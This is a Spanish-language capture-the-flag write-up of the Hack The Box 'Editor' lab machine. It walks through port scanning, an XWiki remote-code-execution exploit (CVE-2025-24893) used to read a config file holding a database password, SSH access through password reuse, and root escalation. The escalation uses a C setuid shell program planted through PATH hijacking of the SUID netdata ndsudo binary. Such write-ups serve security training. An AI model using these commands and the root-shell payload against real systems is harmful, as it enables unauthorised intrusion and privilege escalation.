---
title: Editor
date: 2025-11-24 11:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, editor ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/ba9dec0d022d3c3b6a96aa5dba4772c7.png
    alt: Hack The Box
---

> Editor
Linux · Easy 


## Submit User flag
Mientras se completaba el scanner de nmap se me ocurrió echar un ojo por si había una web y efectivamente
encuentro que al entrar a la ip por el navegador me redirige a ```http://editor.htb/```.  Así que como ya había 
hecho en otros retos anteriores modifico el fichero ```/etc/hosts``` y apunto la ip asignada a el dominio ```editor.htb```. 
Aparece una web con contenido parecido a este:

``` html
Editor Docs About
A Futuristic Code Editor
for Everyone.
SimplistCode Pro — Minimal. Powerful. Redefined for the modern developer.
Download for Debian, Ubuntu.deb Download for Windows.exe
Contact Us
```
Descargo los dos ficheros y me apunto el contacto ```contact@editor.htb``` que aparece en el pie de la web.

``` shell
┌──(pmartinezr㉿kali)-[/etc/openvpn]
└─$ nmap -p- 10.129.47.199 -sV -sC  -T 5 -vv
Not shown: 64327 closed tcp ports (reset), 1205 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.47.199:8080/xwiki/bin/view/Main/
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.05 seconds
           Raw packets sent: 70411 (3.098MB) | Rcvd: 66183 (2.681MB)
```

Tras acabar el scaneo podemos ver que hay un puerto ```8080``` abierto así que como ya tenemos el navegador abierto accedo al mismo.  
Muestra un contenido como este, lo que parce la wiki de ```Èditor``` (el software en cuestión)

``` html

Intro
Last modified by Neal Bagwell on 2025/06/16 09:39
Introduction — SimplistCode Pro Wiki

Welcome to the SimplistCode Pro Documentation

SimplistCode Pro is a lightweight, minimal, and modern text editor and IDE designed for developers who prefer simplicity without compromising functionality. Built with Python and Tkinter, SimplistCode Pro offers essential tools for code editing and project management in a sleek, futuristic interface.
```

Lo primero que me llamó la antención es que a la derecha aparece un panel de login que apunta a este enlace ```http://editor.htb:8080/xwiki/bin/login/XWiki/XWikiLogin?xredirect=%2Fxwiki%2Fbin%2Fview%2FMain%2F&loginLink=1```. ¿Un redirect? cuanto menos interesante, además de que es un punto para intentar injectar código. 

Por supuesto no debemos dejar de buscar exploits para cualquier aplicación 

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ searchsploit xwiki 
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
XWiki 14 - SQL Injection via getdeleteddocuments.vm                                                      | multiple/webapps/52384.c
XWiki 4.2-milestone-2 - Multiple Persistent Cross-Site Scripting Vulnerabilities                         | php/webapps/20856.txt
Xwiki CMS 12.10.2 - Cross Site Scripting (XSS)                                                           | multiple/webapps/49437.txt
XWiki Platform 15.10.10 - Metasploit Module for Remote Code Execution (RCE)                              | multiple/webapps/52429.txt
XWiki Platform 15.10.10 - Remote Code Execution                                                          | multiple/webapps/52136.txt
XWiki Standard 14.10 - Remote Code Execution (RCE)                                                       | php/webapps/52105.py
-----------------------------------
``` 
Tampoco debemos dejar de buscar CVEs en la red [https://nvd.nist.gov/vuln/detail/CVE-2025-32974](https://nvd.nist.gov/vuln/detail/CVE-2025-32974) sin embargo justo esta 
versión no parece afectada. 

Tras buscar un buen rato y probar varios exploits encuentro uno que me convence
[https://github.com/gotr00t0day/CVE-2025-24893/blob/main/xwiki_exploit.py](https://github.com/gotr00t0day/CVE-2025-24893/blob/main/xwiki_exploit.py)

``` shell

┌──(pmartinezr㉿kali)-[~/Downloads]
└─$ python xwiki_exploit.py -u http://wiki.editor.htb/xwiki -c 'ls /home'                                                             
[*] Executing: ls /home
oliver

┌──(pmartinezr㉿kali)-[~/Downloads]
└─$ python xwiki_exploit.py -u http://wiki.editor.htb/xwiki -c 'cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml'

    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

Tras trastear por los directorios del sistema, encuentro un usuario ```oliver``` y además finalmente encuetro un fichero ```hibernate.cfg.xml``` que parece que contiene información importante, ```theEd1t0rTeam99``` una password. 


``` shell
┌──(pmartinezr㉿kali)-[~/Downloads]
└─$ ssh oliver@10.129.47.199
oliver@10.129.47.199's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)
Last login: Tue Nov 25 20:01:38 2025 from 10.10.14.236

oliver@editor:~$ cat user.txt 
68983c3a0163ce1************
```

En este caso el re-use de passwords nos permite acceder a la cuenta de SSH de ```oliver```


## Submit Root Password

``` shell
oliver@editor:~$ groups
oliver netdata
```
Invesgitamos este usuario, para ver si hay algun binario o script/programa que pueda ejecutar con privilegios elevados
 
``` shell
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-rw---- 1 root netdata 4 Nov 25 16:38 /run/ebpf.pid                                                                                     
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 81472 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ioping

```
Me valgo del script ```Linpeas.sh```para realizar una busquda de posibles vulnerabilidades 

``` shell
oliver@editor:~$ find / -user root -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```
Lo corroboro usando find  buscando archivos que se ejecutan con los permisos de root. Esto a veces puede desencadenar una escalada de privilegios si el binario es vulnerable o está mal configurado, explotable, etc.

Otra pista fue buscar en internet más información [https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93). Cuando el fabricante avisa es que algo hay.


``` shell
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h> // Incluir esta biblioteca para usar la función system

int main() {
    // Cambiar al usuario root
    if (setuid(0) != 0) {
        perror("Error al elevar privilegios");
        return 1;
    }

    // Ejecutar una acción con privilegios elevados
    printf("Ahora tienes privilegios de root!\n");
    system("whoami"); // Verificar el usuario actual
    system("/bin/bash");
    return 0;
}
```
Codifico un script en C que convierta el usuario actual en root, si lo hace ejecutará whoami y luego bash. Claro, ahora solo 
falta hacer que se ejecute este. 

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ gcc nvme.c -o nvme

┌──(pmartinezr㉿kali)-[~]
└─$ scp nvme oliver@editor.htb:

```

Lo compilo y lo envío con scp al objetivo. 

``` shell
export PATH=/tmp/bin:$PATH
```

El comando ```ndsudo``` llama a  ```nvme-list``` este comando es como un enlace al binario nvme para forzar el funcionamiento 
configuramos el PATH 


``` shell
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
Ahora tienes privilegios de root!
root
root@editor:/tmp# 
```

Somos root

``` shell
root@editor:/tmp# cat /root/root.txt 
cd0fa20b7c2a7f194fa************
```

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/684)